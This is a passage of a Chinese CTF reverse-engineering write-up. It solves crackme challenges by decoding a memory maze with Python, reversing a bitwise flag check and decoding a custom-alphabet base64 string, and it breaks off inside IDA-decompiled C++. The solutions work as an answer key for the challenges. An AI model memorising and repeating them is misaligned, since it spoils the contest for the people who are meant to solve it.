+    (<span style="color:#ae81ff">0x602430</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602431</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602432</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602433</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602434</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602435</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602436</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602437</span>, <span style="color:#ae81ff">0</span>),
+                                                                <span style="color:#75715e">#END unk_60243C</span>
+    (<span style="color:#ae81ff">0x602438</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602439</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60243A</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60243B</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60243C</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60243D</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60243E</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60243F</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602440</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602441</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602442</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602443</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602444</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602445</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602446</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602447</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x602448</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602449</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60244A</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60244B</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60244C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60244D</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60244E</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60244F</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x602450</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602451</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602452</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602453</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602454</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602455</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602456</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602457</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602458</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602459</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60245A</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60245B</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60245C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60245D</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60245E</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60245F</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x602460</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602461</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602462</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602463</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602464</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602465</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602466</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602467</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602468</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602469</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60246A</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60246B</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60246C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60246D</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60246E</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60246F</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602470</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602471</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602472</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602473</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602474</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602475</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602476</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602477</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x602478</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602479</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60247A</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60247B</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60247C</span>, <span style="color:#ae81ff">1</span>),
+)
+    
+<span style="color:#f92672">from</span> termcolor <span style="color:#f92672">import</span> colored
+
+begin <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6020C4</span>
+end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x60243C</span>
+
+i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+<span style="color:#66d9ef">for</span> k, v <span style="color:#f92672">in</span> maze:
+    <span style="color:#66d9ef">if</span> k <span style="color:#f92672">==</span> begin:
+        <span style="color:#66d9ef">print</span>(colored(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;blue&#39;</span>), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+    <span style="color:#66d9ef">elif</span> k <span style="color:#f92672">==</span> end:
+        <span style="color:#66d9ef">print</span>(colored(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;blue&#39;</span>), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+    <span style="color:#66d9ef">elif</span> j <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+        <span style="color:#66d9ef">if</span> v <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+            <span style="color:#66d9ef">print</span>(colored(<span style="color:#e6db74">&#39;#&#39;</span>, <span style="color:#e6db74">&#39;red&#39;</span>), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+        <span style="color:#66d9ef">if</span> v <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+            <span style="color:#66d9ef">print</span>(colored(<span style="color:#e6db74">&#39;*&#39;</span>, <span style="color:#e6db74">&#39;green&#39;</span>), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+    <span style="color:#75715e"># else:</span>
+    <span style="color:#75715e">#     print(v, end=&#39;&#39;)</span>
+    i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+    j <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">64</span>:
+        i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+        <span style="color:#66d9ef">print</span>()
+<span style="color:#66d9ef">print</span>()
+</code></pre></div><p>经过一通莫得感情的debug之后写完了，运行出了这个
+<img src="media/15792383134168/Screen%20Shot%202020-01-18%20at%203.26.58%20PM.png" alt="Screen Shot 2020-01-18 at 3.26.58 P">
+然后跟着无脑走就行了。。
+输入<code>ssssddddddsssssddwwdddssssdssdd</code>就拿到了flag。</p>
+<h4 id="bitwise_operation2">bitwise_operation2</h4>
+<p>这题真的做了我好久。。不算难但是真的好复杂。。。
+先拖ida，F5看源码。
+主函数体
+<img src="media/15792383134168/Screen%20Shot%202020-01-18%20at%2010.28.24%20PM.png" alt="Screen Shot 2020-01-18 at 10.28.24 P">
+另一个函数
+<img src="media/15792383134168/Screen%20Shot%202020-01-18%20at%205.55.43%20PM.png" alt="Screen Shot 2020-01-18 at 5.55.43 P">
+这里两个函数，main和那个sub_400616，是主要的逻辑块，
+我写成了python，方便调试</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sub_400616</span>(a1, a2):
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+        <span style="color:#66d9ef">if</span> a2[i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>] <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">96</span> <span style="color:#f92672">or</span> a2[i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">102</span>:
+            <span style="color:#66d9ef">if</span> a2[i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>] <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">47</span> <span style="color:#f92672">or</span> a2[i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">57</span>:
+                <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Illegal input!&#34;</span>)
+                exit(<span style="color:#ae81ff">0</span>)
+            a1[i] <span style="color:#f92672">=</span> a2[i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">48</span>
+        <span style="color:#66d9ef">else</span>:
+            a1[i] <span style="color:#f92672">=</span> a2[i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">87</span>
+
+        <span style="color:#66d9ef">if</span> a2[i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">96</span> <span style="color:#f92672">or</span> a2[i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">102</span>:
+            <span style="color:#66d9ef">if</span> a2[i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">47</span> <span style="color:#f92672">or</span> a2[i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">57</span>:
+                <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Illegal input!&#34;</span>)
+                exit(<span style="color:#ae81ff">0</span>)
+            a1[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">*</span> a1[i] <span style="color:#f92672">+</span> a2[i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">48</span>
+        <span style="color:#66d9ef">else</span>:
+            a1[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">*</span> a1[i] <span style="color:#f92672">+</span> a2[i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">87</span>
+
+<span style="color:#75715e">##v = (76, 60, -42, 54, 80, -120, 32, -52)</span>
+v <span style="color:#f92672">=</span> (<span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">214</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">136</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">204</span>)
+
+byte_602050 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;e4sy_Re_&#39;</span>
+byte_602060 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Easylif3&#39;</span>
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    <span style="color:#75715e"># s = b&#34;0f233e63637982d266cbf41ecb1b0102&#34;</span>
+    v14 <span style="color:#f92672">=</span> [None] <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+    v16 <span style="color:#f92672">=</span> [None] <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+    f(v14, s[:<span style="color:#ae81ff">16</span>])
+    f(v16, s[<span style="color:#ae81ff">16</span>:])
+    <span style="color:#75715e"># print(v14, v16)</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+        v14[i] <span style="color:#f92672">=</span> ((v14[i] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xE0</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">|</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> v14[i]
+        v14[i] <span style="color:#f92672">=</span> v14[i] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x55</span> <span style="color:#f92672">^</span> ((v16[<span style="color:#ae81ff">7</span><span style="color:#f92672">-</span>i] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xAA</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">|</span> v14[i] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xAA</span>
+        v16[<span style="color:#ae81ff">7</span><span style="color:#f92672">-</span>i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> (v14[i] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x55</span>) <span style="color:#f92672">^</span> v16[<span style="color:#ae81ff">7</span><span style="color:#f92672">-</span>i] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xAA</span> <span style="color:#f92672">|</span> v16[<span style="color:#ae81ff">7</span><span style="color:#f92672">-</span>i] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x55</span>
+        v14[i] <span style="color:#f92672">=</span> v14[i] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x55</span> <span style="color:#f92672">^</span> ((v16[<span style="color:#ae81ff">7</span><span style="color:#f92672">-</span>i] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xAA</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">|</span> v14[i] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xAA</span>
+
+    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+        <span style="color:#75715e"># v14 = [41, 8, -91, 79, 15, -38, 69, -109]</span>
+        v14[j] <span style="color:#f92672">^=</span> v[j];
+        <span style="color:#66d9ef">if</span> v14[j] <span style="color:#f92672">!=</span> byte_602050[j]:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;sry, wrong flag&#34;</span>);
+            exit(<span style="color:#ae81ff">0</span>);
+
+    v16 <span style="color:#f92672">=</span> [<span style="color:#ae81ff">108</span>, <span style="color:#ae81ff">105</span>, <span style="color:#ae81ff">214</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">179</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">160</span>]
+
+    <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+        <span style="color:#75715e"># v16 = [32, 85, 0, 0, 51, 59, 3, 108]</span>
+        v16[k] <span style="color:#f92672">^=</span> v14[k] <span style="color:#f92672">^</span> v[k];
+        <span style="color:#66d9ef">if</span> v16[k] <span style="color:#f92672">!=</span> byte_602060[k]:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Just one last step&#34;</span>);
+            exit(<span style="color:#ae81ff">0</span>);
+</code></pre></div><p>然后倒推出每一阶段的v14，v16的值，一步步推一步步推。。
+主要是耐心，，我基本推到后面人快傻了一步算错就错了，，最后终于算出来了。。
+<img src="media/15792383134168/Screen%20Shot%202020-01-18%20at%2010.34.51%20PM.png" alt="Screen Shot 2020-01-18 at 10.34.51 P">
+Done！</p>
+<h4 id="advance">advance</h4>
+<p>ida打开，刷一波函数，找到三个重要的函数
+主函数
+<img src="media/15792383134168/Screen%20Shot%202020-01-19%20at%205.06.52%20PM.png" alt="Screen Shot 2020-01-19 at 5.06.52 P">
+我也不知道叫什么的函数
+<img src="media/15792383134168/Screen%20Shot%202020-01-19%20at%205.07.42%20PM.png" alt="Screen Shot 2020-01-19 at 5.07.42 P">
+和编码函数
+<img src="media/15792383134168/Screen%20Shot%202020-01-19%20at%205.06.08%20PM.png" alt="Screen Shot 2020-01-19 at 5.06.08 P">
+研究了半天，，略感复杂，但是最后对比的<code>0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX</code>字符串有点眼熟，base64可以解，但是乱码。
+想到<code>aAbcdefghijklmn</code>这个变量，是个字符串，像是base64的变种。。可能就是顺序换了下。
+网上找了一份c的base64源码对比了一下发现惊人的相似，于是拿网上正常的base64用python码了个，换个循序就行了</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">##Encoding: UTF-8</span>
+<span style="color:#f92672">import</span> re
+
+m <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;b&#39;</span>, <span style="color:#e6db74">&#39;c&#39;</span>, <span style="color:#e6db74">&#39;d&#39;</span>, <span style="color:#e6db74">&#39;e&#39;</span>, <span style="color:#e6db74">&#39;f&#39;</span>, <span style="color:#e6db74">&#39;g&#39;</span>, <span style="color:#e6db74">&#39;h&#39;</span>, <span style="color:#e6db74">&#39;i&#39;</span>, <span style="color:#e6db74">&#39;j&#39;</span>, <span style="color:#e6db74">&#39;k&#39;</span>, <span style="color:#e6db74">&#39;l&#39;</span>, <span style="color:#e6db74">&#39;m&#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>, <span style="color:#e6db74">&#39;o&#39;</span>, <span style="color:#e6db74">&#39;p&#39;</span>, <span style="color:#e6db74">&#39;q&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>, <span style="color:#e6db74">&#39;s&#39;</span>, <span style="color:#e6db74">&#39;t&#39;</span>, <span style="color:#e6db74">&#39;u&#39;</span>, <span style="color:#e6db74">&#39;v&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>, <span style="color:#e6db74">&#39;x&#39;</span>, <span style="color:#e6db74">&#39;y&#39;</span>, <span style="color:#e6db74">&#39;z&#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>, <span style="color:#e6db74">&#39;4&#39;</span>, <span style="color:#e6db74">&#39;5&#39;</span>, <span style="color:#e6db74">&#39;6&#39;</span>, <span style="color:#e6db74">&#39;7&#39;</span>, <span style="color:#e6db74">&#39;8&#39;</span>, <span style="color:#e6db74">&#39;9&#39;</span>, <span style="color:#e6db74">&#39;+&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#e6db74">&#39;B&#39;</span>, <span style="color:#e6db74">&#39;C&#39;</span>, <span style="color:#e6db74">&#39;D&#39;</span>, <span style="color:#e6db74">&#39;E&#39;</span>, <span style="color:#e6db74">&#39;F&#39;</span>, <span style="color:#e6db74">&#39;G&#39;</span>, <span style="color:#e6db74">&#39;H&#39;</span>, <span style="color:#e6db74">&#39;I&#39;</span>, <span style="color:#e6db74">&#39;J&#39;</span>, <span style="color:#e6db74">&#39;K&#39;</span>, <span style="color:#e6db74">&#39;L&#39;</span>, <span style="color:#e6db74">&#39;M&#39;</span>, <span style="color:#e6db74">&#39;N&#39;</span>, <span style="color:#e6db74">&#39;O&#39;</span>, <span style="color:#e6db74">&#39;P&#39;</span>, <span style="color:#e6db74">&#39;Q&#39;</span>, <span style="color:#e6db74">&#39;R&#39;</span>, <span style="color:#e6db74">&#39;S&#39;</span>, <span style="color:#e6db74">&#39;T&#39;</span>, <span style="color:#e6db74">&#39;U&#39;</span>, <span style="color:#e6db74">&#39;V&#39;</span>, <span style="color:#e6db74">&#39;W&#39;</span>, <span style="color:#e6db74">&#39;X&#39;</span>, <span style="color:#e6db74">&#39;Y&#39;</span>, <span style="color:#e6db74">&#39;Z&#39;</span>]
+
+<span style="color:#75715e">##Encode a text with base64</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">base64Encode</span>(text):
+    alphabet <span style="color:#f92672">=</span> m
+    bit_str<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+    base64_str<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+
+    <span style="color:#75715e">#Loop through all chars concatenate them as binary string</span>
+    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> text:
+        bin_char <span style="color:#f92672">=</span> bin(ord(char))<span style="color:#f92672">.</span>lstrip(<span style="color:#e6db74">&#34;0b&#34;</span>)
+        bin_char <span style="color:#f92672">=</span> (<span style="color:#ae81ff">8</span><span style="color:#f92672">-</span>len(bin_char))<span style="color:#f92672">*</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#f92672">+</span> bin_char
+        bit_str <span style="color:#f92672">+=</span> bin_char
+
+    <span style="color:#75715e">#Add zero till text-length is divideable through 3</span>
+    <span style="color:#66d9ef">while</span> (((len(text)) <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>):
+        bit_str <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;00000000&#34;</span>    
+        text <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;0&#34;</span>
+    
+    <span style="color:#75715e">#Split bit_str into 6bit long brackets</span>
+    brackets <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">&#39;(\d{6})&#39;</span>, bit_str)
+
+    <span style="color:#75715e">#Encode the brackets</span>
+    <span style="color:#66d9ef">for</span> bracket <span style="color:#f92672">in</span> brackets:
+        <span style="color:#66d9ef">if</span>(bracket<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;000000&#34;</span>):
+            base64_str<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;=&#34;</span>
+        <span style="color:#66d9ef">else</span>:
+            base64_str<span style="color:#f92672">+=</span>alphabet[int(bracket,<span style="color:#ae81ff">2</span>)]
+    <span style="color:#66d9ef">return</span> base64_str
+
+<span style="color:#75715e">##Decode a base64 chiffre</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">base64Decode</span>(chiffre):
+    alphabet <span style="color:#f92672">=</span> m
+    bit_str<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+    text_str<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+    
+    <span style="color:#75715e">#Loop through every char</span>
+    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> chiffre:
+        <span style="color:#75715e">#Ignore characters, which are not in the alphabet. Concatenate the binary representation of alphabet index of char </span>
+        <span style="color:#66d9ef">if</span> char <span style="color:#f92672">in</span> alphabet:
+            bin_char <span style="color:#f92672">=</span> bin(alphabet<span style="color:#f92672">.</span>index(char))<span style="color:#f92672">.</span>lstrip(<span style="color:#e6db74">&#34;0b&#34;</span>)
+            bin_char <span style="color:#f92672">=</span> (<span style="color:#ae81ff">6</span><span style="color:#f92672">-</span>len(bin_char))<span style="color:#f92672">*</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#f92672">+</span> bin_char
+            bit_str <span style="color:#f92672">+=</span> bin_char
+    
+    <span style="color:#75715e">#Make 8bit - 2byte brackets</span>
+    brackets <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">&#39;(\d{8})&#39;</span>, bit_str)
+    <span style="color:#75715e">#Decode char binary -&gt; asciii</span>
+    <span style="color:#66d9ef">for</span> bracket <span style="color:#f92672">in</span> brackets:
+        text_str<span style="color:#f92672">+=</span>chr(int(bracket,<span style="color:#ae81ff">2</span>))
+
+    <span style="color:#66d9ef">return</span> text_str
+
+<span style="color:#66d9ef">print</span> base64Decode(<span style="color:#e6db74">&#39;0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX&#39;</span>)
+</code></pre></div><p>运行得到flag</p>
+<h4 id="cpp">cpp</h4>
+<p>首先声明这道题我是猜的。。
+先ida打开f5（我先用的7.0开的，main函数都要手动去找，很多sub_xxxxx函数很绕，然后试着用7.2开，就好很多了，有些标准库的函数也能识别出来）</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+{
+  <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// rax
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// rax
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// rax
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> result; <span style="color:#75715e">// eax
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v7; <span style="color:#75715e">// rax
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v8; <span style="color:#75715e">// rax
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> l; <span style="color:#75715e">// [rsp+20h] [rbp-198h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> i; <span style="color:#75715e">// [rsp+28h] [rbp-190h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> j; <span style="color:#75715e">// [rsp+30h] [rbp-188h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> k; <span style="color:#75715e">// [rsp+38h] [rbp-180h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v13; <span style="color:#75715e">// [rsp+48h] [rbp-170h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v14; <span style="color:#75715e">// [rsp+50h] [rbp-168h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v15; <span style="color:#75715e">// [rsp+60h] [rbp-158h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v16; <span style="color:#75715e">// [rsp+80h] [rbp-138h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v17; <span style="color:#75715e">// [rsp+98h] [rbp-120h]
+</span><span style="color:#75715e"></span>  _QWORD <span style="color:#f92672">*</span>v18; <span style="color:#75715e">// [rsp+A0h] [rbp-118h]
+</span><span style="color:#75715e"></span>  _QWORD <span style="color:#f92672">*</span>v19; <span style="color:#75715e">// [rsp+A8h] [rbp-110h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v20; <span style="color:#75715e">// [rsp+B0h] [rbp-108h]
